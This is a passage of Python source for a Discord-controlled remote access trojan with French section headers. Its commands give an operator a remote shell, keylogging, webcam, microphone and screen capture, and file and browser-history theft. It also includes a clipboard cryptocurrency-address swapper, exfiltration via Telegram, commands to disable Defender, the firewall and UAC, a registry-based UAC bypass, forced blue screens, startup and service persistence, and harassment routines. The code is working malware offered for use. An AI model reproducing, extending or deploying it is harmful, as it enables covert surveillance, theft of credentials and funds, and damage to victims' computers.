        await ctx.send(file=discord.File(p))
        os.remove(p)
    else:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def keylog(ctx, action: str):
    action = action.lower()
    if action == "start":
        r = skl()
    elif action == "stop":
        r = stkl()
    elif action == "dump":
        r = dkl()
        if len(r) > 1900:
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(r)
            await ctx.send(file=discord.File(f.name, filename="keylog.txt"))
            os.remove(f.name)
            return
    else:
        r = "Use start/stop/dump"
    await ctx.send(embed=se(r))

@bot.command()
async def shell(ctx, *, cmd: str):
    out = es(cmd)
    if len(out) > 1900:
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write(out)
        await ctx.send(file=discord.File(f.name, filename="output.txt"))
        os.remove(f.name)
    else:
        await ctx.send(embed=se(f"```{out}```"))

@bot.command()
async def cd(ctx, *, path: str):
    try:
        os.chdir(path)
        await ctx.send(embed=se(f"`{os.getcwd()}`"))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def dir(ctx):
    try:
        items = os.listdir()
        await ctx.send(embed=se(f"```\n" + "\n".join(items[:50]) + "\n```"))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def download(ctx, *, filepath: str):
    if not os.path.exists(filepath):
        await ctx.send(embed=se("File not found", color=0xff0000))
        return
    await ctx.send(file=discord.File(filepath))

@bot.command()
async def upload(ctx):
    if not ctx.message.attachments:
        await ctx.send(embed=se("Attach a file", color=0xff0000))
        return
    for a in ctx.message.attachments:
        path = os.path.join(os.getcwd(), a.filename)
        await a.save(path)
        await ctx.send(embed=se(f"Saved `{a.filename}`"))

@bot.command()
async def delete(ctx, *, filepath: str):
    try:
        os.remove(filepath)
        await ctx.send(embed=se(f"Deleted `{filepath}`"))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def execute(ctx, *, filepath: str):
    try:
        os.startfile(filepath)
        await ctx.send(embed=se(f"Executed `{filepath}`"))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def shutdown(ctx):
    await ctx.send(embed=se("Shutting down..."))
    os.system("shutdown /s /t 5")

@bot.command()
async def restart(ctx):
    await ctx.send(embed=se("Restarting..."))
    os.system("shutdown /r /t 5")

@bot.command()
async def logoff(ctx):
    await ctx.send(embed=se("Logging off..."))
    os.system("shutdown /l")

@bot.command()
async def bsod(ctx):
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send(embed=se("Admin required", color=0xff0000))
        return
    await ctx.send(embed=se("Triggering BSOD..."))
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

@bot.command()
async def blockinput(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.user32.BlockInput(True)
        await ctx.send(embed=se("Input blocked"))
    else:
        await ctx.send(embed=se("Admin required", color=0xff0000))

@bot.command()
async def unblockinput(ctx):
    ctypes.windll.user32.BlockInput(False)
    await ctx.send(embed=se("Input unblocked"))

@bot.command()
async def disabletaskmgr(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        disable_taskmgr()
        await ctx.send(embed=se("Task Manager disabled"))
    else:
        await ctx.send(embed=se("Admin required", color=0xff0000))

@bot.command()
async def enabletaskmgr(ctx):
    enable_taskmgr()
    await ctx.send(embed=se("Task Manager enabled"))

@bot.command()
async def critproc(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        await ctx.send(embed=se("Process is critical"))
    else:
        await ctx.send(embed=se("Admin required", color=0xff0000))

@bot.command()
async def uncritproc(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
        await ctx.send(embed=se("Process not critical"))
    else:
        await ctx.send(embed=se("Admin required", color=0xff0000))

@bot.command()
async def env(ctx):
    e = "\n".join([f"{k}: {v}" for k, v in os.environ.items()])
    if len(e) > 1900:
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write(e)
        await ctx.send(file=discord.File(f.name, filename="env.txt"))
        os.remove(f.name)
    else:
        await ctx.send(embed=se(f"```{e}```"))

@bot.command()
async def taskschd(ctx):
    out = es("schtasks /query /fo LIST")
    if len(out) > 1900:
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write(out)
        await ctx.send(file=discord.File(f.name, filename="tasks.txt"))
        os.remove(f.name)
    else:
        await ctx.send(embed=se(f"```{out}```"))

@bot.command()
async def website(ctx, *, url):
    if not url.startswith("http"):
        url = "https://" + url
    os.startfile(url)
    await ctx.send(embed=se(f"Opened `{url}`"))

@bot.command()
async def message(ctx, *, text):
    ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0x40)
    await ctx.send(embed=se("Message box displayed"))

@bot.command()
async def voice(ctx, *, text):
    try:
        speaker = wincl.Dispatch("SAPI.SpVoice")
        speaker.Speak(text)
        comtypes.CoUninitialize()
        await ctx.send(embed=se(f"Speaking: {text[:50]}"))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def wallpaper(ctx):
    if not ctx.message.attachments:
        await ctx.send(embed=se("Attach an image", color=0xff0000))
        return
    a = ctx.message.attachments[0]
    p = os.path.join(tempfile.gettempdir(), a.filename)
    await a.save(p)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, p, 0)
    await ctx.send(embed=se("Wallpaper changed"))

@bot.command()
async def clipboard(ctx):
    try:
        data = pyperclip.paste()
        await ctx.send(embed=se(f"```{data}```"))
    except:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def admincheck(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send(embed=se("Admin: Yes", color=0x00ff00))
    else:
        await ctx.send(embed=se("Admin: No", color=0xff0000))

@bot.command()
async def getadmin(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send(embed=se("Already admin"))
    else:
        try:
            p = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            if getattr(sys, 'frozen', False):
                ctypes.windll.shell32.ShellExecuteW(None, "runas", p, "", None, 0)
            else:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{p}"', None, 0)
            await ctx.send(embed=se("Admin prompt sent, exiting..."))
            await asyncio.sleep(2)
            sys.exit()
        except Exception as e:
            await ctx.send(embed=se(f"Failed: {e}", color=0xff0000))

@bot.command()
async def disabledefender(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        subprocess.run(
            'powershell -c "Add-MpPreference -ExclusionPath C:\\"',
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
        await ctx.send(embed=se("Exclusion added to Defender"))
    else:
        await ctx.send(embed=se("Admin required", color=0xff0000))

@bot.command()
async def disablefirewall(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        subprocess.run('netsh advfirewall set allprofiles state off', shell=True,
                       creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
        await ctx.send(embed=se("Firewall disabled"))
    else:
        await ctx.send(embed=se("Admin required", color=0xff0000))

@bot.command()
async def exit(ctx):
    await ctx.send(embed=se("Exiting..."))
    sys.exit()

@bot.command()
async def kill(ctx, target="all"):
    if target.lower() == "all":
        await ctx.send(embed=se("Killing all..."))
        sys.exit()
    else:
        await ctx.send(embed=se("Use `!kill all`"))

# ---------- NOUVELLES COMMANDES ----------

@bot.command()
async def settelegram(ctx, token: str, chatid: str):
    global telegram_bot_token, telegram_chat_id
    telegram_bot_token = token
    telegram_chat_id = chatid
    await ctx.send(embed=se(f"Telegram configured: token `{token[:10]}...`, chat `{chatid}`"))
    send_telegram("Telegram exfiltration activated")

@bot.command()
async def cryptosteal(ctx, mode: str):
    global crypto_steal_active
    if mode.lower() == "on":
        if not crypto_steal_active:
            crypto_steal_active = True
            threading.Thread(target=crypto_steal_thread, daemon=True).start()
            await ctx.send(embed=se("🔒 Clipboard crypto-stealer activated"))
            send_telegram("Clipboard crypto-stealer started")
        else:
            await ctx.send(embed=se("Already running"))
    elif mode.lower() == "off":
        crypto_steal_active = False
        await ctx.send(embed=se("Clipboard crypto-stealer deactivated"))
        send_telegram("Clipboard crypto-stealer stopped")
    else:
        await ctx.send(embed=se("Use on/off", color=0xff0000))

@bot.command()
async def setbtc(ctx, address: str):
    global crypto_btc_addr
    if re.match(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', address):
        crypto_btc_addr = address
        await ctx.send(embed=se(f"BTC replacement address set to `{address}`"))
    else:
        await ctx.send(embed=se("Invalid BTC address", color=0xff0000))

@bot.command()
async def seteth(ctx, address: str):
    global crypto_eth_addr
    if re.match(r'^0x[a-fA-F0-9]{40}$', address):
        crypto_eth_addr = address
        await ctx.send(embed=se(f"ETH replacement address set to `{address}`"))
    else:
        await ctx.send(embed=se("Invalid ETH address", color=0xff0000))

@bot.command()
async def uefi(ctx):
    result = uefi_persistence()
    await ctx.send(embed=se(result))
    send_telegram(f"UEFI persistence: {result}")

@bot.command()
async def grabfiles(ctx):
    await ctx.send("Searching interesting files...")
    zp = grab_files()
    if not zp:
        await ctx.send(embed=se("No interesting files found", color=0xff0000))
        return
    await ctx.send(file=discord.File(zp, filename="grabbed_files.zip"))
    os.remove(zp)
    send_telegram("Files grabbed and sent")

@bot.command()
async def downloadfolder(ctx, *, folder_path: str):
    await ctx.send(f"Zipping folder `{folder_path}`...")
    zp = download_folder(folder_path)
    if not zp:
        await ctx.send(embed=se("Folder not found or error", color=0xff0000))
        return
    await ctx.send(file=discord.File(zp, filename=os.path.basename(folder_path) + ".zip"))
    os.remove(zp)

@bot.command()
async def scanlan(ctx):
    await ctx.send("Scanning local network (may take a minute)...")
    hosts = scan_lan()
    if hosts:
        await ctx.send(embed=se(f"**Hosts found:**\n" + "\n".join(hosts)))
        send_telegram(f"LAN scan found {len(hosts)} hosts")
    else:
        await ctx.send(embed=se("No hosts found", color=0xff0000))

@bot.command()
async def service(ctx, action: str, name: str, *, binpath: str = None):
    if action.lower() not in ["install", "remove", "start", "stop"]:
        await ctx.send(embed=se("Actions: install, remove, start, stop", color=0xff0000))
        return
    if action.lower() == "install" and not binpath:
        await ctx.send(embed=se("For install, provide binary path", color=0xff0000))
        return
    if action.lower() in ["remove", "start", "stop"] and not name:
        await ctx.send(embed=se("Service name required", color=0xff0000))
        return
    if action.lower() == "install" and not binpath:
        binpath = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    res = manage_service(action.lower(), name, binpath)
    await ctx.send(embed=se(f"**Service:** {res}"))
    send_telegram(f"Service {action} {name}: {res}")

@bot.command()
async def history(ctx):
    if bh is None:
        await ctx.send(embed=se("BrowserHistory module not installed", color=0xff0000))
        return
    try:
        dict_obj = bh.get_browserhistory()
        strobj = str(dict_obj).encode(errors='ignore')
        with tempfile.NamedTemporaryFile(mode='w', delete=False, encoding='utf-8') as f:
            f.write(str(strobj))
        await ctx.send(file=discord.File(f.name, filename="history.txt"))
        os.remove(f.name)
        send_telegram("Browser history dumped")
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

# ---------- TROLLING ----------
@bot.command()
async def crazymouse(ctx, seconds: int):
    if seconds < 1:
        seconds = 1
    if seconds > 60:
        seconds = 60
    await ctx.send(f"🐭 Crazy mouse for {seconds}s...")
    def _cm():
        end = time.time() + seconds
        sw, sh = pyautogui.size()
        while time.time() < end:
            pyautogui.moveTo(random.randint(0, sw), random.randint(0, sh), duration=0.05)
    threading.Thread(target=_cm, daemon=True).start()

@bot.command()
async def earthquake(ctx, seconds: int):
    if seconds < 1:
        seconds = 1
    if seconds > 30:
        seconds = 30
    await ctx.send(f"🌍 Earthquake for {seconds}s...")
    def _eq():
        end = time.time() + seconds
        while time.time() < end:
            def enum(hwnd, _):
                if win32gui.IsWindowVisible(hwnd):
                    try:
                        r = win32gui.GetWindowRect(hwnd)
                        win32gui.MoveWindow(hwnd, r[0] + random.randint(-15, 15), r[1] + random.randint(-15, 15),
                                            r[2] - r[0], r[3] - r[1], True)
                    except:
                        pass
            try:
                win32gui.EnumWindows(enum, None)
            except:
                pass
            time.sleep(0.04)
    threading.Thread(target=_eq, daemon=True).start()

@bot.command()
async def fakeerror(ctx, count: int, *, text="A critical error occurred"):
    if count > 50:
        count = 50
    await ctx.send(f"⚠️ Spawning {count} error boxes...")
    def _fe():
        for _ in range(count):
            ctypes.windll.user32.MessageBoxW(0, text, "Critical Error", 0x10)
    threading.Thread(target=_fe, daemon=True).start()

@bot.command()
async def flipscreen(ctx, arg="flip"):
    try:
        arg = arg.lower()
        temp = os.getenv('TEMP')
        if arg == "reset":
            taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(taskbar, 5)
            progman = ctypes.windll.user32.FindWindowW("Progman", None)
            ctypes.windll.user32.SendMessageW(progman, 0x0111, 0x7402, 0)
            await ctx.send(embed=se("🔄 Screen reset (taskbar & icons restored)"))
        else:
            with mss() as sct:
                sct.shot(output=os.path.join(temp, "flip_ss.png"))
            flip_src = os.path.join(temp, "flip_ss.png").replace("\\", "\\\\")
            flip_dst = os.path.join(temp, "flip_wp.bmp").replace("\\", "\\\\")
            ps = f'Add-Type -AssemblyName System.Drawing; $i=[System.Drawing.Image]::FromFile("{flip_src}"); $i.RotateFlip([System.Drawing.RotateFlipType]::Rotate180FlipNone); $i.Save("{flip_dst}",[System.Drawing.Imaging.ImageFormat]::Bmp); $i.Dispose()'
            subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps], capture_output=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            wp_path = os.path.join(temp, "flip_wp.bmp")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wp_path, 3)
            progman = ctypes.windll.user32.FindWindowW("Progman", None)
            ctypes.windll.user32.SendMessageW(progman, 0x0111, 0x7402, 0)
            taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(taskbar, 0)
            await ctx.send(embed=se("🔄 Screen flipped. Use `!flipscreen reset` to undo."))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def jumpscare(ctx):
    try:
        vu()
        temp = os.getenv('TEMP')
        html = os.path.join(temp, "jumpscare.html")
        with open(html, 'w') as f:
            f.write(
                '<html><head><style>*{margin:0;padding:0;cursor:none}body{background:#000;overflow:hidden}</style></head><body>'
                '<img id="s" src="https://upload.wikimedia.org/wikipedia/commons/8/89/Scary_Face.jpg" style="width:100vw;height:100vh;object-fit:cover;display:none">'
                '<script>'
                'let c=new(window.AudioContext||window.webkitAudioContext),o=c.createOscillator(),g=c.createGain();'
                'o.type="sawtooth";o.frequency.value=180;g.gain.value=1;o.connect(g);g.connect(c.destination);'
                'document.onclick=()=>{document.documentElement.requestFullscreen().catch(()=>{})};'
                'setTimeout(()=>{document.getElementById("s").style.display="block";o.start();'
                'document.documentElement.requestFullscreen().catch(()=>{});'
                'setTimeout(()=>{o.stop();},4000);},300);'
                '</script></body></html>')
        os.startfile(html)
        def _bs():
            for _ in range(6):
                ctypes.windll.kernel32.Beep(2500, 400)
                time.sleep(0.1)
        threading.Thread(target=_bs, daemon=True).start()
        await ctx.send(embed=se("👻 Jumpscare executed"))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def rickroll(ctx):
    os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    await ctx.send(embed=se("🎵 Rickroll! Never gonna give you up..."))

@bot.command()
async def opencd(ctx):
    ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
    await ctx.send(embed=se("💿 CD tray opened"))

@bot.command()
async def closecd(ctx):
    ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    await ctx.send(embed=se("💿 CD tray closed"))

@bot.command()
async def swapbuttons(ctx):
    ctypes.windll.user32.SwapMouseButton(True)
    await ctx.send(embed=se("🖱️ Mouse buttons swapped"))

@bot.command()
async def unswapbuttons(ctx):
    ctypes.windll.user32.SwapMouseButton(False)
    await ctx.send(embed=se("🖱️ Mouse buttons restored"))

@bot.command()
async def hidedesktop(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0,
                             winreg.KEY_ALL_ACCESS)
        try:
            val, _ = winreg.QueryValueEx(key, "HideIcons")
            new = 0 if val else 1
        except:
            new = 1
        winreg.SetValueEx(key, "HideIcons", 0, winreg.REG_DWORD, new)
        winreg.CloseKey(key)
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True,
                       creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(1)
        subprocess.Popen(["explorer.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
        label = "hidden" if new else "restored"
        await ctx.send(embed=se(f"🖥️ Desktop icons {label}"))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def spam_site(ctx, url: str, amount: int = 100):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    await ctx.send(f"Spamming {url} ({amount} tabs)...")
    def _ss():
        for _ in range(amount):
            try:
                subprocess.Popen(f'start "" "{url}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                time.sleep(0.05)
            except:
                pass
    threading.Thread(target=_ss, daemon=True).start()

@bot.command()
async def spamtts(ctx, count: int, *, text="You have been hacked"):
    if count > 20:
        count = 20
    vu()
    def _st():
        speaker = wincl.Dispatch("SAPI.SpVoice")
        for _ in range(count):
            speaker.Speak(text)
        comtypes.CoUninitialize()
    threading.Thread(target=_st, daemon=True).start()
    await ctx.send(f"🗣️ TTS spam '{text}' x{count}")

@bot.command()
async def beep(ctx, count: int = 10):
    if count > 100:
        count = 100
    def _bp():
        for _ in range(count):
            freq = random.randint(200, 5000)
            ctypes.windll.kernel32.Beep(freq, 200)
    threading.Thread(target=_bp, daemon=True).start()
    await ctx.send(f"🔊 Beep spam {count} times")

@bot.command()
async def sing(ctx, *, url):
    vu()
    if url.startswith("http"):
        url = url[url.find('www'):]
    os.system(f'start {url}')
    def _hide():
        time.sleep(2)
        def enum(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                if "youtube" in win32gui.GetWindowText(hwnd).lower():
                    win32gui.ShowWindow(hwnd, SW_HIDE)
                    global pid_process
                    pid_process = win32process.GetWindowThreadProcessId(hwnd)
                    return
        win32gui.EnumWindows(enum, None)
    threading.Thread(target=_hide, daemon=True).start()
    await ctx.send(f"🎵 Playing {url} hidden")

@bot.command()
async def stopsing(ctx):
    if pid_process:
        os.system(f"taskkill /F /IM {pid_process[1]}")

# ---------- SURVEILLANCE AVANCÉE ----------
@bot.command()
async def windowstart(ctx):
    global stop_threads, _thread
    stop_threads = False
    async def winlog():
        while not stop_threads:
            try:
                w = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                await bot.change_presence(activity=discord.Game(f"Visiting: {w}"))
                await asyncio.sleep(1)
            except:
                break
    _thread = threading.Thread(target=lambda: asyncio.run(winlog()), daemon=True)
    _thread.start()
    await ctx.send(embed=se("Window logging started"))

@bot.command()
async def windowstop(ctx):
    global stop_threads
    stop_threads = True
    await ctx.send(embed=se("Window logging stopped"))

@bot.command()
async def screenrecord(ctx, seconds: int):
    if seconds > 30:
        seconds = 30
    await ctx.send(f"🎬 Recording screen {seconds}s...")
    p = rs(seconds)
    if p:
        await ctx.send(file=discord.File(p))
        os.remove(p)
    else:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def livemic(ctx, seconds: int):
    if seconds > 30:
        seconds = 30
    await ctx.send(f"🎙️ Live mic {seconds}s...")
    p = rm(seconds)
    if p:
        await ctx.send(file=discord.File(p))
        os.remove(p)
    else:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def livecam(ctx, seconds: int):
    if cv2 is None:
        await ctx.send(embed=se("OpenCV not installed", color=0xff0000))
        return
    if seconds > 30:
        seconds = 30
    await ctx.send(f"📹 Live cam {seconds}s...")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send(embed=se("Cannot open camera", color=0xff0000))
        return
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    p = os.path.join(tempfile.gettempdir(), "livecam.avi")
    out = cv2.VideoWriter(p, fourcc, 20.0, (640, 480))
    start = time.time()
    while time.time() - start < seconds:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        time.sleep(0.05)
    cap.release()
    out.release()
    if os.path.exists(p):
        await ctx.send(file=discord.File(p))
        os.remove(p)
    else:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def recentvideo(ctx, duration: int = 30, minutes_ago: int = 0):
    if duration > 300:
        duration = 300
    if minutes_ago > 60:
        minutes_ago = 60
    offset = minutes_ago * 60
    await ctx.send(f"🎬 Recording {duration}s from {minutes_ago} min ago...")
    p = rs_old(duration, offset)
    if p:
        await ctx.send(file=discord.File(p))
        os.remove(p)
    else:
        await ctx.send(embed=se("Failed", color=0xff0000))

# ---------- SYSTEM ADDONS ----------
@bot.command()
async def geolocate(ctx):
    try:
        ip = gi()
        loc = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
        if loc.get('status') == 'success':
            desc = f"**IP:** `{loc.get('query')}`\n**Country:** `{loc.get('country')}`\n**City:** `{loc.get('city')}`\n**ISP:** `{loc.get('isp')}`\n**Map:** https://www.google.com/maps?q={loc.get('lat')},{loc.get('lon')}"
            await ctx.send(embed=se(desc))
        else:
            await ctx.send(embed=se("Geolocation failed", color=0xff0000))
    except:
        await ctx.send(embed=se("Geolocation failed", color=0xff0000))

@bot.command()
async def disableuac(ctx):
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send(embed=se("Admin required", color=0xff0000))
        return
    subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f',
                   shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    await ctx.send(embed=se("UAC disabled (reboot required)"))

@bot.command()
async def uacbypass(ctx):
    try:
        subprocess.run('reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "cmd.exe /c start cmd.exe" /f',
                       shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f',
                       shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('start computerdefaults.exe', shell=True, capture_output=True,
                       creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send(embed=se("UAC bypass attempted (admin cmd may open)"))
    except Exception as e:
        await ctx.send(embed=se(f"Error: {e}", color=0xff0000))

@bot.command()
async def startup(ctx, action: str):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    if action.lower() == "add":
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SnoopStartup", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        await ctx.send(embed=se("Added to startup"))
    elif action.lower() == "remove":
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SnoopStartup")
            winreg.CloseKey(key)
            await ctx.send(embed=se("Removed from startup"))
        except:
            await ctx.send(embed=se("Not found", color=0xff0000))
    else:
        await ctx.send(embed=se("Use add/remove", color=0xff0000))

@bot.command()
async def rootkit(ctx):
    try:
        p = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        subprocess.run(['attrib', '+h', '+s', p], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send(embed=se("Process hidden"))
    except:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def unrootkit(ctx):
    try:
        p = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        subprocess.run(['attrib', '-h', '-s', p], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send(embed=se("Process visible"))
    except:
        await ctx.send(embed=se("Failed", color=0xff0000))

@bot.command()
async def audio(ctx):
    if not ctx.message.attachments:
        await ctx.send(embed=se("Attach an audio file", color=0xff0000))
        return
    a = ctx.message.attachments[0]
    p = os.path.join(tempfile.gettempdir(), a.filename)
    await a.save(p)
    os.startfile(p)
    await ctx.send(embed=se(f"Playing {a.filename}"))

@bot.command()
async def datetime(ctx):
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    await ctx.send(embed=se(f"`{now}`"))

# ---------- HELP COMPLET ----------
@bot.command(name="help", aliases=["commands", "aide"])
async def help_command(ctx):
    cmds = """
**📡 SYSTEM**
`!sysinfo` `!publicip` `!idletime` `!admincheck` `!getadmin` `!env` `!taskschd` `!wifi` `!geolocate` `!disableuac` `!uacbypass` `!startup` `!rootkit` `!unrootkit` `!uefi`

**📂 FILES**
`!cd` `!dir` `!download` `!upload` `!delete` `!execute` `!downloadfolder` `!grabfiles`

**👁️ SURVEILLANCE**
`!screenshot` `!webcampic` `!mic` `!record` `!keylog` `!clipboard` `!windowstart` `!windowstop` `!screenrecord` `!livemic` `!livecam` `!recentvideo`

**🔒 SECURITY**
`!password` `!grabtokens` `!roblox` `!steam` `!telegraminfo` `!disabledefender` `!disablefirewall`

**💰 CRYPTO & EXFIL**
`!cryptosteal on/off` `!setbtc <addr>` `!seteth <addr>` `!settelegram <token> <chatid>`

**⚡ CONTROL**
`!shell` `!website` `!message` `!voice` `!wallpaper` `!blockinput` `!unblockinput` `!disabletaskmgr` `!enabletaskmgr` `!critproc` `!uncritproc`

**🎭 TROLLING**
`!crazymouse` `!earthquake` `!fakeerror` `!flipscreen` `!jumpscare` `!rickroll` `!opencd` `!closecd` `!swapbuttons` `!unswapbuttons` `!hidedesktop` `!spam_site` `!spamtts` `!beep` `!sing` `!stopsing`

**💀 DESTRUCTIVE**
`!shutdown` `!restart` `!logoff` `!bsod` `!lock` `!unlock`

**🌐 NETWORK**
`!scanlan`

**🔁 PERSISTENCE**
`!service install/remove/start/stop`

**🎵 OTHER**
`!audio` `!datetime` `!history`

**🔚 SESSION**
`!exit` `!kill all`
"""
    await ctx.send(embed=se(cmds))

# ---------- GESTION DES ERREURS ----------
@bot.event
async def on_command_error(ctx, error):
    await ctx.send(embed=se(f"Error: {str(error)}", color=0xff0000))

# ---------- LANCEMENT ----------
if __name__ == "__main__":
    if DISCORD_TOKEN == "YOUR_BASE64_ENCODED_TOKEN_HERE" or "YOUR_BASE64_ENCODED_TOKEN_HERE" in DISCORD_TOKEN:
        print("ERROR: Token not configured")
        sys.exit(1)
    try:
        bot.run(DISCORD_TOKEN)
    except Exception as e:
        print(f"Error: {e}")